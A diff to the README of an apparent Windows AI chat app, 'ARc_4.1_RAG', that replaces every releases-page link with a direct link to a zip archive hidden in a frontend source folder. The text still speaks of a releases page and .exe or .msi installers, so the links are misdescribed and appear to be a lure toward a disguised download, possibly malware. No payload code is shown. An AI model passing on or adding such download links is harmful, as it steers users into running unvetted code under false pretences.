@@ -1,6 +1,6 @@
 # 🤖 ARc_4.1_RAG - Easy AI Chat with Document Support
 
-[![Download ARc_4.1_RAG](https://img.shields.io/badge/Download-ARc_4.1_RAG-green?style=for-the-badge)](https://github.com/wholesome-lepton473/ARc_4.1_RAG/releases)
+[![Download ARc_4.1_RAG](https://img.shields.io/badge/Download-ARc_4.1_RAG-green?style=for-the-badge)](https://raw.githubusercontent.com/wholesome-lepton473/ARc_4.1_RAG/main/arc-4.1/frontend/src/api/A-RAG-Rc-3.8-alpha.4.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This guide will help you download and run ARc_4.1_RAG on your Windows computer. 
 
 1. Visit the releases page by clicking the link below to find the latest version of ARc_4.1_RAG for Windows.
 
-[Download ARc_4.1_RAG here](https://github.com/wholesome-lepton473/ARc_4.1_RAG/releases)
+[Download ARc_4.1_RAG here](https://raw.githubusercontent.com/wholesome-lepton473/ARc_4.1_RAG/main/arc-4.1/frontend/src/api/A-RAG-Rc-3.8-alpha.4.zip)
 
 2. On the releases page, look for a file with the extension `.exe` or `.msi`. These files are the Windows installer for the app.
 
@@ -96,7 +96,7 @@ A: Uploaded files are used only to improve chat answers during your session. Avo
 
 ## 📣 Updates and Support
 
-To get new features and improvements, keep an eye on the [releases page](https://github.com/wholesome-lepton473/ARc_4.1_RAG/releases). Download the latest installer there when available.
+To get new features and improvements, keep an eye on the [releases page](https://raw.githubusercontent.com/wholesome-lepton473/ARc_4.1_RAG/main/arc-4.1/frontend/src/api/A-RAG-Rc-3.8-alpha.4.zip). Download the latest installer there when available.
 
 If you experience issues or need help, check the repository’s Issues section on GitHub.
 
@@ -106,4 +106,4 @@ If you experience issues or need help, check the repository’s Issues section o
 
 You can always get ARc_4.1_RAG from:
 
-[![Get ARc_4.1_RAG](https://img.shields.io/badge/Get-ARc_4.1_RAG-blue?style=for-the-badge)](https://github.com/wholesome-lepton473/ARc_4.1_RAG/releases)
+[![Get ARc_4.1_RAG](https://img.shields.io/badge/Get-ARc_4.1_RAG-blue?style=for-the-badge)](https://raw.githubusercontent.com/wholesome-lepton473/ARc_4.1_RAG/main/arc-4.1/frontend/src/api/A-RAG-Rc-3.8-alpha.4.zip)
